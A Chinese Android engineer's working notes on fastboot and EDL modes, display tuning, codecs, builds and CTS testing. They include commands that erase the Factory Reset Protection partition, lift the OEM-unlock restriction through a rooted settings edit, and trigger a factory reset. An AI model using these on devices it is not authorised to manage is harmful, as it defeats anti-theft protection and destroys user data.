手机进去高通9008模式的步骤:1. 打开 USB调试,使用命令 adb reboot edl;2. 或者进入手机fastboot模式,执行命令 fastboot oem edl;3. 进入高通模式9008模式时,手机黑屏,但是连接上电脑有反应,设备管理器可以见到 一台串口为9008的设备.高通9008模式是磁盘模式,清理手机数据,防止手机变卡.
```

## FRP

```text
其中最为关键的是Account Data Blocks，其实就是一个独立的存储分区（500kb），该分区在fatctory reset时不能进入，通过系统中的ro.frp.pst来制定该分区的路劲（通常默认的路劲都是/dev/block），对其的R/W操作是通过API——也就是android.service.persistentdata.PersistentDataBlockManager来操作的

值得注意的是：

FRP功能存在于任何登录了google账号以及打开了oem unlock功能的手机上。（oem-unlock功能存在于开发者选项中，默认是enable的，据了解该功能也是google开发，主要用处在于lock bootloader镜像）分区的最后一个字节应该用于信号的OEM-UNLOCK状态。如果字节为0，OEM-UNLOCK位DISABLE。即，当此字节设置为0，​fastboot oem unlock应该​失败。 该字节必须在出厂时设置为0。enable/disbale OEM-UNLOCK只能通过PersistentDataBlockManager这个API来更改（相当于更改分区最后一byte）。








1.如何打开OEM unlock

2.如何清空 FRP 的数据??

3.fastboot如何解锁bootloader

4.定制修改fastboot用于读取image?

5.用fastboot烧入新的空的image?（需要先解BL？）

6.


fastboot flashing unlock    #6.0以上设备 设备必须解锁，开始刷机（这个不同的手机厂商不同）
fastboot erase {partition}  # 擦除分区
fastboot erase  frp    # 擦除 frp 分区，frp 即 Factory Reset Protection，用于防止用户信息在手机丢失后外泄 
fastboot flash boot boot.img # 刷入 boot 分区 
fastboot flash system system.img # 刷入 system 分区 
fastboot flash recovery recovery.img # 刷入 recovery 分区 
fastboot flashall #烧写所有分区，注意：此命令会在当前目录中查找所有img文件，将这些img文件烧写到所有对应的分区中，并重新启动手机。 
fastboot format data # 格式化 data 分区 
fastboot flashing lock # 设备上锁，刷机完毕 
fastboot continue # 自动重启设备 
fastboot reboot# 重启手机 
fastboot reboot-bootloader# 重启到bootloader 刷机用 
fastboot devices ## 发现手机，显示当前哪些手机通过fastboot连接了 
```

## TODO : 如何监听某个服务ATService是否启动？？

```text

```

## TODO : RoleManager获取默认Dialer

```text
```

## [cmd] 恢复出厂设置

```text
Android 10
adb shell am broadcast -a android.intent.action.FACTORY_RESET -p android --es android.intent.extra.REASON MasterClearConfirm
```

## ARM核心的运行模式

```text
（1） User Mode：用户模式。操作系统的Task一般以这种模式执行。User Mode是ARM唯一的非特权模式，这表示如果CPU处于这种模式下，很多指令将不能够执行，因此操作系统的资源得以保护。 
（2） System Mode：这是V4及其以上版本所引入的特权模式。
（3） IRQ Mode：中断模式。中断（不包括软中断）处理函数在这种模式下执行。 
（4） FIQ Mode：快速中断模式。除了多了几个寄存器外，其他同IRQ一样。 
（5） Supervisor Mode：监视模式。软中断（SWI)处理函数在这种模式下执行。 
（6） Abort Mode：所有同内存保护相关的异常均在这种模式下执行。 
（7） Undefined Mode：处理无效指令的异常处理函数在这种模式下执行

TEE可以构建一个隔离（隔离更准确，相比于独立于）于Android，iOS的小型操作系统，让具备安全，隐私诉求的应用在隔离于这些主操作系统的应用运行于此。打个不恰当的比喻，比如女生去商场买衣服，商场就类似这个操作系统，试衣间就是TEE，隔离于大的商场，提供小型的独立的操作环境，突然想起来了优衣库。。。。。。，呃呃呃，恶趣味了点，不过这个倒是和Android和TEE关系很像，构建的这个隔离的私有的环境的安全也是相对的，还是要有保护和安全意识。
```

## android 优化策略

```text
kernel 部分：
1、iRom 升级为 V2.1，支持 usb 下载、Readretry 功能，修正了 uboot0 备份的问题，如果用于 x15 需要在 TF 卡外置上拉电阻
2、PMU RICOH618 + x9，bootst 用于判断启动模式（PMU\RTC 寄存器）
3、item 子系统标准化，参数都在 platform_data 里面初始化，其余地方不再调用 item 接口
4、GPIO 采用 Linux 标准子系统
5、clock 子系统也采用 Linux 标准子系统
6、dvfs 子系统
        当前 cpu 的 loading 以及正在运行的线程数决定 cpu 个数，其中 loading 有3个临界点（30%、50%、80%），线程数有3个临界点（2、9、13）
7、功耗优化：
        以太网的 PHY 通过用户设置来打开，可以节约 30mA
        HDMI 的 hotplug 引脚需要打开 PHY 才能用，这里用一个 GPIO 与其连接，当 GPIO 收到中断时才打开 HDMI PHY，可以节约 10mA
8、camera 采用 Linux 标准的 V4L2 架构
9、休眠的时候 GPIO 除了 SDIO、USB、RTC 可以配置状态保留以外，其他的 GPIO 都会复位
10、Tiny OS 采用 buildroot，包含 qt4、gtk2 等库

android 部分：
1、vendor 代码，厂家相关的都存放于 /device 目录下
2、dumpsys infotmic.service
3、支持多分区存储，支持 USB Hub
4、TP 报点准则（和屏幕旋转相关）
        a、X、Y 范围：必须符合竖屏系统的定义即：X 为短轴、Y 为长轴
        b、X、Y 报点：X 为短轴，Y为长轴
5、G-sensor
        a、坐标轴需要为右手系，可以在 HAL 层的 sensor.h 里面定义，framework 层的 ScreenRotationAnimation.java
        b、surfaceflinger 关于 screenshot 的实现固定是按屏幕的物理方向
        c、item 里面可以配置 G-sensor 方向

性能优化：
1、bionic 库：用汇编指令优化 c 库
2、libjpeg、libpng、libwebp、libgif 图标解码库
        NE10 浮点优化、NE10 color space 转化、NE10 rotate 变换
3、webkit 内存和图片硬解码优化
4、java 虚拟机优化（内存）
5、多媒体播放（ffmpeg库、software codec）

android 系统策略优化：

1、显示系统：
        a、view 系统更新 dirty region 大小的计算优化
        b、HW composer 2D 的使用策略评估
        c、硬件 VSYNC 机制优化（android 所有画图都是根据这个同步）
2、屏幕旋转：
        a、预转屏、提高灵敏度
        b、优化 launcher 重布局时间
3、热开关机
        save the heap image (like core dump) of Zygote after preloading classes
4、网络模块
        a、兼容 wifi
        b、以太网标准化
        c、支持蓝牙 profile

用户场景优化：
1、开机优化
        a、preload resource / class
        b、service 裁剪
        c、开机广播消息裁剪
        d、多线程 parse apk

多媒体部分：
1、Audio 采用的都是软解码，所以大部分不能播放的问题应该都能解
2、Video 采用软解 + 硬解
        H.263 采用软解，最高支持 720x576
3、VPU 动态变频（48M - 305M）
        soc.vpu.dvfs 开关   config.media.out rgb565 (rgb888) 解码输出格式
4、字幕支持 3gp、srt 格式
5、多音频 Track
6、ION 内存管理，因为 x9 硬件（MMU）支持小块内存映射成连续内存，所以不需要预留内存
7、性能
        GPU 默认为 300M 并关闭变频，功耗影响不大，如果某些场景视频卡顿有可能是 GPU 变频引起的
8、支持 USB、ISP camera
9、media_profiles.xml
        camera 需要增加这个文件用来配置一些上层用到的参数，不通过 V4L2 获取
10、Wifi - Display
```

## YUV图像格式转换

```text
成员变量赋值
ySize = videoWidth * videoHeight; // Y分量大小
oneFrameSize = (ySize * 3) >> 1;  // 一帧画面大小
uvSize = oneFrameSize - ySize;    // UV分量大小
uvHalfSize = uvSize / 2;                 // UV分量的一半
uvBytes = new byte[uvSize] ;          // 用于存放UV分量数据
maxIndex = ySize + uvHalfSize;    // 最大索引

YV12转I420
private void YV12ToI420(byte[]  yuvDatas) {
    for (i = ySize; i < maxIndex; i++) {
     temp = yuvDatas[i] ;
     yuvDatas[i]  = yuvDatas[i + uvHalfSize] ;
     yuvDatas[i + uvHalfSize]  = temp;
    }
}

I420转NV12
private void I420ToNV12(byte[]  i420Bytes) {
    index = 0;
    for (i = ySize; i < maxIndex; i++) {
     uvBytes[index]  = i420Bytes[i] ;
     uvBytes[index + 1]  = i420Bytes[i + uvHalfSize] ;
     index += 2; // 上面已经连续存储了两个位置了，所以这里要跳2
    }
    System.arraycopy(uvBytes, 0, i420Bytes, ySize, uvSize);
}

NV21转NV12
private void NV21ToNV12(byte[]  yuvDatas) {
    for (index = ySize; index < oneFrameSize; index += 2) {
     temp = yuvDatas[index] ;
     yuvDatas[index]  = yuvDatas[index + 1] ;
     yuvDatas[index + 1]  = temp;
    }
}
```

## [cmd] 生成与合入patch

```text
git diff > a.patch
patch -p1 < a.patch
```

## Developer Options "show view updates"

```text
debug.hwui.show_dirty_regions
```

## Launcher 图标丢失问题

```text
3|Messages|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.google.android.apps.messaging/.ui.ConversationListActivity;end|-101|1|1|0|1|1|0|-1|||�PNG
�
||1609632082793|0|0|0|0
4|Chrome|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.android.chrome/com.google.android.apps.chrome.Main;end|-101|2|2|0|1|1|0|-1|||||0|0|0|0|0
5|Camera|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.hmdglobal.app.litecamera/com.mediatek.camera.CameraLauncher;end|-101|3|3|0|1|1|0|-1|||||0|0|0|0|0
6|Google||-100|0|0|3|1|1|2|-1|||||0|0|0|0|0
7|Google Go|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.google.android.apps.searchlite/.ui.SearchActivity;end|6|0|0|0|1|1|0|-1|||�PNG
�
||1609632067221|0|0|0|0
8|Gmail|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.google.android.gm/.ConversationListActivityGmail;end|6|0|1|0|1|1|0|-1|||�PNG
�
||1646898179554|0|0|1|0
9|Maps|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.google.android.apps.maps/com.google.android.maps.MapsActivity;end|6|0|2|0|1|1|0|-1|||�PNG
�
||1609632341844|0|0|2|0
10|YouTube|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.google.android.youtube/.app.honeycomb.Shell%24HomeActivity;end|6|0|0|1|1|1|0|-1|||�PNG
�
||1609632167586|0|0|3|0
11|Gallery|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.google.android.apps.photosgo/.home.HomeActivity;end|6|0|1|1|1|1|0|-1|||�PNG
�
||1609632073363|0|0|4|0
12|Duo|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.google.android.apps.tachyon/.MainActivity;end|6|0|2|1|1|1|0|-1|||�PNG
�
||1609632095794|0|0|5|0
13|云端硬盘|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.google.android.apps.docs/.app.NewMainProxyActivity;end|6|0|0|2|1|1|0|-1|||�PNG
�
||1647493037348|0|0|6|0
14|YT Music|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.google.android.apps.youtube.music/.activities.MusicActivity;end|6|0|1|2|1|1|0|-1|||�PNG
�
||1609632304713|0|0|7|0
15|Google Play Movies & TV|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.google.android.videos/com.google.android.youtube.videos.EntryPoint;end|6|0|2|2|1|1|0|-1|||�PNG
�
||1609632321788|0|0|8|0
16|Google 助理|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.google.android.apps.assistant/.go.MainActivity;end|-100|0|1|3|1|1|0|-1|||�PNG
�
||1646898171910|0|0|0|0
17|Play Store|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.android.vending/.AssetBrowserActivity;end|-100|0|2|3|1|1|0|-1|||�PNG
�
||1609632097995|0|0|0|0
18|Apps||-100|0|3|3|1|1|2|-1|||||0|0|0|0|0
19|My phone|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.hmdglobal.support/.ui.EntryActivity;end|18||||1|1|0|-1|||||0|0|0|0|0
20|Netflix|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.netflix.mediaclient/.ui.launch.UIWebViewActivity;end|18|0|1|0|1|1|0|-1|||||1609632025976|0|0|1|0
21|Lite|#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10200000;component=com.facebook.lite/.MainActivity;end|18|0|0|1|1|1|0|-1|||�PNG
�
||1609689877931|0|0|2|0
```

## [cmd] 查看SettingsProvider的修改记录

```text
adb shell dumpsys setings

Historical operations
1970-01-01 01:13:46 persist
1970-01-01 01:13:46 update auto_time_zone
1970-01-01 01:12:47 persist
1970-01-01 01:12:47 update auto_time_zone
1970-01-01 00:09:46 persist
1970-01-01 00:09:45 update Phenotype_boot_count
1970-01-01 00:02:25 persist
1970-01-01 00:02:24 update need_show_storage
1970-01-01 00:01:51 persist
1970-01-01 00:01:50 update need_show_storage
1970-01-01 00:01:50 update need_show_storage
1970-01-01 00:01:46 persist
1970-01-01 00:01:46 update network_recommendations_enabled
1970-01-01 00:01:39 persist
1970-01-01 00:01:39 update network_recommendations_enabled
1970-01-01 00:01:24 persist
1970-01-01 00:01:24 update battery_estimates_last_update_time
1970-01-01 00:01:24 persist
1970-01-01 00:01:23 update network_recommendations_enabled
1970-01-01 00:01:23 update network_recommendations_enabled

源码
frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/SettingsService.java

Settings provider (settings) commands:
  help
      Print this help text.
  get [--user <USER_ID> | current]  NAMESPACE KEY
      Retrieve the current value of KEY.
  put [--user <USER_ID> | current]  NAMESPACE KEY VALUE [TAG]  [default] 
      Change the contents of KEY to VALUE.
      TAG to associate with the setting.
      {default} to set as the default, case-insensitive only for global/secure namespace
  delete [--user <USER_ID> | current]  NAMESPACE KEY
      Delete the entry for KEY.
  reset [--user <USER_ID> | current]  NAMESPACE {PACKAGE_NAME | RESET_MODE}
      Reset the global/secure table for a package with mode.
      RESET_MODE is one of {untrusted_defaults, untrusted_clear, trusted_defaults}, case-insensitive
  list [--user <USER_ID> | current]  NAMESPACE
      Print all defined keys.
      NAMESPACE is one of {system, secure, global}, case-insensitive

reset 后面的参数是 adb shell settings reset global trusted_defaults 不过好像不起作用？
```

## STF minicap/minitouch

```text
安装 minicap
git clone https://github.com/openstf/minicap
cd minicap
git submodule init
git submodule update
ndk-build

测试
adb shell LD_LIBRARY_PATH=/data/local/tmp /data/local/tmp/minicap -P : Display projection (x@x/{0|90|180|270}).

adb shell LD_LIBRARY_PATH=/data/local/tmp /data/local/tmp/minicap -P 1080x1920@1080x1920/0
这里和分别表示设备屏幕的宽和高，中间是小写字母 x 。

cmd下 安装minitouch：
git clone https://github.com/openstf/minitouch
cd minitouch
git submodule init
git submodule update
ndk-build

执行 git submodule update 这一步出现两个问题，解决方法如下：
Android NDK: APP_PLATFORM not set. Defaulting to minimum supported version android-14.

从网站下载 libevdev-1.5.9 ：https://www.freedesktop.org/software/libevdev/
找到 Application.mk 文件，然后修改这个文件就解决了

添加内容
APP_PLATFORM := android-14
APP_ABI := all

参考链接：https://www.jianshu.com/p/65b2a613dfe5

fatal error: ‘libevdev.h’ file not found
从 libevdev-1.5.9 里面取出 libevdev文件夹， 复制到
C:\Users\xxx\minitouch\jni\vendor\libevdev\source\
然后再次输入 ndk-build 成功了。



STF（Smartphone Test Farm）是一个Android手机设备管理平台，通过在浏览器上远程调试智能手机、手表和其它设备，一般用于远程管理、调试、监控多个设备。atxserver2移动设备管理平台支持支持Android和iOS，它也使用到了STF。本文介绍如何使用两个工具来搭建Android手机管理平台。
```

## 在AOSP中使用okhttp

```text
LOCAL_STATIC_JAVA_LIBRARIES += okhttp-nojarjar
```

## whatfuck1

```text
早期的Android系统几乎只支持ARMv5的CPU架构，后面发展到支持七种不同的CPU架构：ARMv5，ARMv7 (从2010年起)，x86 (从2011年起)，MIPS (从2012年起)，ARMv8，MIPS64和x86_64 (从2014年起)，每一种都关联着一个相应的ABI。
应用程序二进制接口（Application Binary Interface）定义了二进制文件（尤其是.so文件）如何运行在相应的系统平台上，从使用的指令集，内存对齐到可用的系统函数库。
在Android 系统上，每一个CPU架构对应一个ABI：armeabi，armeabi-v7a，x86，mips，arm64- v8a，mips64，x86_64。
但是最新的谷歌官方文档已经把mips和armv5移除了

x86 / x86_64: x86 架构的手机都会包含由 Intel 提供的称为 Houdini 的指令集动态转码工具，实现 对 arm .so 的兼容，再考虑 x86 1% 以下的市场占有率，x86 相关的两个 .so 也是可以忽略的
armeabi: ARM v5 这是相当老旧的一个版本，缺少对浮点数计算的硬件支持，在需要大量计算时有性能瓶颈
armeabi-v7a: ARM v7
arm64-v8a: 64位支持，目前主流的版本，虽然网上很多博客都说v7是主流版本，但是我亲自试验了很多手机，都是arm64-v8a的架构，测试机型包括小米5-小米9，华为P30，华为mate10，魅蓝2等均是v8架构
查询手机cpu命令行：

adb shell getprop ro.product.cpu.abi
二、ABI是如何工作的
一个Android设备可以支持多种ABI,设备主ABI和辅助ABI,以arm64-v8a为主ABI的设备，辅助ABI为armeabi-v7a和armeabi，以armeabi-v7a为主ABI的设备，辅助ABI为armeabi。
另外，x86 架构的手机都会包含由 Intel 提供的称为 Houdini 的指令集动态转码工具，实现对 arm .so 的兼容，也就是说有适配armeabi平台的APP是可以跑在x86手机上的。

对于一个cpu是arm64-v8a架构的手机，它运行app时，进入jnilibs去读取库文件时，先看有没有arm64-v8a文件夹，如果没有该文件夹，去找armeabi-v7a文件夹，如果没有，再去找armeabi文件夹，如果连这个文件夹也没有，就抛出异常；
如果有arm64-v8a文件夹，那么就去找特定名称的.so文件，注意：如果没有找到想要的.so文件，不会再往下（armeabi-v7a文件夹）找了，而是直接抛出异常。

四、项目中该如何适配
Q1： 只适配了armeabi-v7a,那如果APP装在其他架构的手机上，如arm64-v8a上，会蹦吗？
A: 不会，但是反过来会。
因为armeabi-v7a和arm64-v8a会向下兼容：

只适配armeabi的APP可以跑在armeabi,x86,x86_64,armeabi-v7a,arm64-v8上
只适配armeabi-v7a可以运行在armeabi-v7a和arm64-v8a
只适配arm64-v8a 可以运行在arm64-v8a上
那我们该如何适配呢？给出如下几个方案：

只适配armeabi
优点:基本上适配了全部CPU架构（除了淘汰的mips和mips_64）
缺点：性能低，相当于在绝大多数手机上都是需要辅助ABI或动态转码来兼容
只适配 armeabi-v7a
同理方案一，只是又筛掉了一部分老旧设备,在性能和兼容二者中比较平衡
只适配 arm64-v8
优点: 性能最佳
缺点： 只能运行在arm64-v8上，要放弃部分老旧设备用户
这三种方案都是可以的，现在的大厂APP适配中，这三种都有，大部分是前2种方案。具体选哪一种就看自己的考量了，以性能换兼容就arm64-v8,以兼容换性能armeabi,二者稍微平衡一点的就armeabi-v7a。

早在今年(2019)一月份，Google 就发布通知，在今年 8 月 1 日开始，上架的 App，除了提供 32 位的版本之外，还需要提供 64 位的版本。

因此，项目之前强制只使用armeabi一种架构的方式已经不行了。
那这里说的 64 位版本支持，到底是什么？
如果你的应用，完全是使用 Java 或者 Kotlin 编写代码，不包含任何原生（Native）的支持，那么就表示这个应用已经支持 64 位。
但是应用内使用了任何原生（Native）的支持（so 库），就需要针对这些 so 文件，针对不同的 CPU 架构提供不同的版本的 so 支持。
需要注意的是，有些时候，在我们自身的代码中，确实没有用到原生的支持，但是在 App 中使用的一些第三方库中却包含了。
此时最稳妥的方式，就是针对最终打包生成的 APK 文件进行分析，来判断是否需要提供 64 位架构的支持。
```

## HDR

```text
HDR10



最基础的标准莫过于 HDR10 了，这是所有厂商 HDR 的基础，它是由消费者技术协会2015年8月27日宣布的开放标准，不需要支付任何版权费。这个标准要求必须使用宽色域 Rec.2020 色彩空间，10bit 色深，以及 SMPTE ST 2084（PQ）图像传输功能，但它的数据元全部是静态的，简单来说就是每一帧所输出的 HDR 图像效果是一样的。目前所有支持 4K HDR 的设备都必须达到这个标准，例如 LG、三星、夏普、索尼和 Vizio 等电视制造商，微软的 Xbox One 系列游戏主机、索尼的 PlayStation 4 游戏主机以及苹果的 Apple TV 4K 等。当然，4K UHD 蓝光、4K UHD 流媒体都必须支持这个最基础的标准。

在这里需要说明一下，索尼的 PlayStation 4 主机并不支持 4K UHD 蓝光视频播放，关于更多支持4K HDR10 的设备请到Hao4k产品库中查看！

杜比视界（Dolby Vision） HDR



杜比视界 HDR 是由杜比实验室提出并定制的 HDR 当前最高级标准，与 HDR10 不同的是，它不是开放的标准，需要使用它必须交付一定的版权费用（据悉是每年每台设备3美元）。杜比视界要求必须使用宽色域 Rec.2020 色彩空间， SMPTE ST 2084（PQ）图像传输功能，与 HDR10 不同的是，它采用 12bit 色深，并且支持动态数据元结构，杜比视界允许 10000 尼特的最大亮度（目前在设备中最高只达到 4000 尼特）。下载4K HDR10 的演示视频和4K HDR10的电影在Hao4K（https://www.hao4k.com/）网站中都有，另外买野货网站种也有速度与激情4K HDR10资源（http://www.maiyehuo.com）

当前支持杜比视界 HDR 的电视包括 LG、索尼、TCL、Visio 等厂商的部分产品，支持输出杜比视界 HDR 显示器以及投影仪暂时还没出现。4K UHD 蓝光机中，支持杜比视界 HDR 的有 LG、索尼、OPPO、飞利浦、松下等厂商的部分产品。

HDR10+



HDR10+，也称为 HDR10 Plus，于2017年4月20日由三星和亚马逊 Video 共同公布，由于杜比视界 HDR 极高的版权费用，三星等厂商不愿意支付，所以与松下、亚马逊和20世纪福斯创建了 HDR10 + 联盟，以推广HDR10 +标准。HDR10+ 通过添加动态元数据来更新 HDR10，动态元数据可用于在逐个场景或逐帧的基础上更精确地调整 HDR 的亮度级别，和杜比视界 HDR 类似，不过色深依旧是 10bit。



HDR10+ 视频于2017年12月13日开始由亚马逊视频提供，2018年1月5日，华纳兄弟宣布支持 HDR10 + 标准并加入 HDR10+ 联盟。2018年1月6日，松下宣布推出支持 HDR10 + 的 4K UHD 蓝光播放器。

HLG（Hybrid Log-Gamma）

HLG 是由 BBC 和 NHK 联合开发的 HDR 标准，它与标准动态范围（SDR）显示兼容，但它需要 10bit 色深。HLG 定义了非线性电光传递函数（EOTF），其中信号值的下半部分使用伽马曲线，信号值的上半部分使用对数曲线。HLG 标准免版税，与 SDR 显示兼容。HLG 由 HDMI 2.0b、HEVC、VP9 和 H.264 / MPEG-4 AVC 提供支持。HLG 主要应用于广播以及部分流媒体，如 BBC iPlayer、DirecTV、Freeview Play 和 YouTube。

以上4个都是目前最主流的 HDR 标准，到这里其实应该结束的，但是，意外总是那么多，因为各家厂商又搞了几套自己定制的 LOGO，搞得人弄不清。比如……

HDR Pro



凡是有用到这个 LOGO 的，就是 LG 给出的对于 HDR10 的推广 LOGO 来的，早在2016年的时候，LG 在推广自己的产品比如 LG 43UH6500 这类早期 4K HDR 电视的时候，都会带上这个标志，但实际上它本质还是 HDR10。当然，现在新款的 HDR 电视已经不会再出现这个 LOGO 了。

4K HDR



这个 LOGO 是索尼的，泛指它们家的 4K HDR 产品线，凡是标注了这个 LOGO 的，全线产品都支持 HDR10 ，或者部分产品支持杜比视界 HDR，例如 Bravia A1E 和 A8F。

看到这里，是不是晕了，是不是想哭？你以为到这里就算终结了吗？并没有！因为，显示器这一块，又搞出了一个新名堂！

DisplayHDR



2017年，VESA (美国视讯电子标准协会)推出 DisplayPort 1.4 规范，导入最新的 Alt Mode USB-C 与 HBR3 的规范，让显示器能透过 USB-C 的接口来传输高分辨率的视频画面，以利新一代手机娱乐、专业视讯与电竞应用。

2018年，VESA 再度推出 DisplayPort 1.4a 版本，除针对手机平台推出 VDC-M 压缩标准、DP8K 信号线认证标准之外，其中引人注目的，就是针对显示器产业，制定出 DisplayHDR 的新标准，该标准明确制定出 HDR 400、600、1000 等入门、中阶、高阶的 HDR 显示器的效能分级标准，搭配 VESA 协会将于近期展开各种符合 HDR 的产品认证计划，将加速产业推出相关的认证产品。

由于 UHD 联盟推出的 UltraHD Premium 标准需要缴纳很高的权利金，在显示器领域，甚至是笔记本电脑领域里，还是比较困难的。对此，VESA 推出的 DisplayHDR 标准很好的解决了这个问题。这次 VESA 针对 HDR 的统一认证标准，推出了 HDR400、HDR600 与 HDR1000，就是要让电脑产业也有相对应的标准可供遵循。除了原先的最高规 HDR1000 效能标准(相当于UHD Premium)之外，还制定出 HDR600 与 HDR400 这两种中端与入门效能标准，只要符合该标准的产品，就可打上认证标章，会员是不需要缴交权利金的。
```

## 内存管理 —— ION

```text
http://kernel.meizu.com/memory%20management%20-%20ion.html
```

## A12平台上用ccache

```text
A12平台上用ccache进行编译会遇到如下问题：

ccache: error: Failed to create directory /home/yangxueju/.ccache/tmp: Read-only file system.

问题原因：更新了soong sandboxing mechanism架构，导致ccache 强制无法与源代码在同一分区内。

问题解决：
删除我们原先的.ccache 文件夹
.bashrc中新增：
export CCACHE_DIR=/mnt/yangxueju1/ccache
路径指向机械硬盘（或者其他分区，不能与源代码在同一分区）中的新建文件夹ccache

source后 执行ccache -M 100G -F 0;再执行ccache -s或者ccache -sv 可以看到
Cache directory:            /mnt/yangxueju1/ccache

路径为你设置为文件夹路径则表示设置成功。

然后进行项目构建。

可以用 ccache -s 查看数据是否有变动，如果一直在变动则代表ccache编译生效。

编译时间可以从1h40min 缩短到40min
```

## 深色模式

```text
final boolean active = (getContext().getResources().getConfiguration().uiMode & Configuration.UI_MODE_NIGHT_YES) != 0;
```

## device_config

```text
adb shell device_config get attention_manager_service enable_flip_to_screen_off

DeviceConfigService.java
```

## Magic Jira Filter

```text
project = "NVA" AND assignee = 'malijie' AND status = "Open" ORDER BY created DESC
```

## [cmd] iotop

```text
adb shell iotop
```

## sqlite打log方法

```text
frameworks/base/core/jni/android_database_SQLiteGlobal.cpp

理论上可以使用adb shell setprop log.tag.SQLiteLog V来打开verbose log的限制，实测没有生效，究其原因是因为这个函数是在zygote进程初始化时调用的，后续孵化出来的进程不会再进行注册，因此可以采用如下两种方式设置：

adb shell setprop persist.log.tag.SQLiteLog V并重启手机；
adb shell setprop log.tag.SQLiteLog V并通过stop; start重启上层；
无论哪种方法都需要root权限，但带root的软件不好衡量性能指标，因此最好使用如下方案：

方案
因此比较稳妥的方法是使用WARNING级别的log：
从上方回调函数可以看到，当errType == SQLITE_WARNING时是无条件输出的，因此可以直接使用：

sqlite3_log(SQLITE_WARNING, "SQLITE_WARNING:ZSUI:-->sqlite3_open-->zFilename=%s", zFilename);
即可；

后记
log仅仅是调试用，实际生产环境切记要删除，SQLite的API是高密度操作，挂log会导致性能下降。

https://blog.csdn.net/u014175785/article/details/105165613?spm=1001.2014.3001.5502
```

## 关于Recovery及OTA升级的一些积累

```text
https://blog.csdn.net/liyuchong2537631/article/details/102739235
```

## oem置灰不能打开

```text
可采用下面两种方法解决。

1.在frameworks/base/core/res/res/values/config.xml中去掉<item>"no_oem_unlock"</item>一行
2.对于ud版本软件，可进行如下操作解决
adb root
adb pull /data/system/users/0.xml ~/Desktop/0.xml
将0.xml中的<restrictions no_oem_unlock="true" />，值改为false保存
adb push ~/Desktop/0.xml /data/system/users/0.xml
adb reboot
```

## 在 ubuntu 下编译 android 找不到头文件问题解决

```text
https://blog.csdn.net/u013718730/article/details/118013393

在 ubuntu 下编译 android 找不到头文件问题解决

在 ubuntu 下编译 android 的时候， 发现编译错误， 有些头文件找不到， 如：
致命错误: alsa/asoundlib.h: 没有那个文件或目录

网上搜索了一下， 原因是某些库没安装导致。
可以使用 apt-file 查看该头文件在什么库中， 找到相应的库， 安装即可。
安装 apt-file ：
sudo apt-get install apt-file
查找头文件：
apt-file search 头文件， 如：
apt-file search alsa/asoundlib.h
找到结果如下：
libasound4-dev: /usr/include/alsa/asoundlib.h
安装 libasound4-dev 即可：
sudo apt-get install libasound4-dev

安装一些库的时候提示以下错误：
无法修正错误， 因为您要求某些软件包保持线程， 就是它们破坏了软件包间依赖关系。

网上查了下， 说删除一些源， 然后更新， 就可以搞定。
我机器中的源没有改过， 所以也不知道删那些。
手动检查更新， 并执行更新。
然后再执行 sudo apt-get update 。
再重新安装包， 还是有同样错误。

有人说需要选中 更新管理器 -> 设置（软件源） -> 更新 中的“推荐更新”， 打开我的， 看了一下， 已经选中。
但是“不支持的更新”也选中了， 把这个干掉。
然后到 更新管理器 -> 设置（软件源） -> Ubuntu软件中， 把“下载自”从“中国的服务器”切换到“主服务器”。
回到更新管理器， 重新检查了一遍， 确实又有些东东需要更新， 执行更新。
然后到命令行执行：
sudo apt-get update
貌似也下载了一些东西， 虽然不多。

在回答前面， 去安装库， 发现 OK 了。
估计是因为我安装的是中文版， 所以更新源默认下载自“中国的服务器”。
```

## 添加分区

```text
https://blog.csdn.net/qq_18906227/article/details/108731632
```

## 下载AndroidX

```text
mkdir ~/bin
PATH=~/bin:$PATH
curl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repo
chmod a+x ~/bin/repo

mkdir androidx-master-dev && cd androidx-master-dev
repo init -u https://android.googlesource.com/platform/manifest -b androidx-master-dev
repo sync -c -j9
```

## Android.bp无条件宏控

```text
cflags: ["-DXXX"]  + [ // ANDROIDMK TRANSLATION ERROR: endif from unsupported contitional
// endif
    "-Wno-error=implicit-function-declaration",
    "-DPRINT",
] ,
```

## CTS---atest

```text
https://blog.csdn.net/fchyang/article/details/110816935
https://source.android.google.cn/docs/core/tests/development/atest?hl=zh-cn


adb shell setprop log.tag.ImageReaderTest V && adb shell setprop log.tag.CameraTestUtils V
atest ImageReaderTest#testLongProcessingRepeatingFlexibleYuv
```

## CTS----instrument

```text
https://source.android.google.cn/docs/core/tests/development/instrumentation

make -j32 CtsCameraTestCases | tee CtsCameraTestCases.log

adb shell install -r out/target/product/k61v1_64_bsp/testcases/CtsCameraTestCases/arm64/CtsCameraTestCases.apk

adb shell pm list instrumentation

adb shell am instrument -r -e class android.hardware.camera2.cts.ImageReaderTest#testLongProcessingRepeatingFlexibleYuv -w android.camera.cts/androidx.test.runner.AndroidJUnitRunner
```

## Antutu 比较图片

```text
private void setTags(Drawable drawable) {
    if ("com.antutu.ABenchMark".equalsIgnoreCase(getPackageName())) {
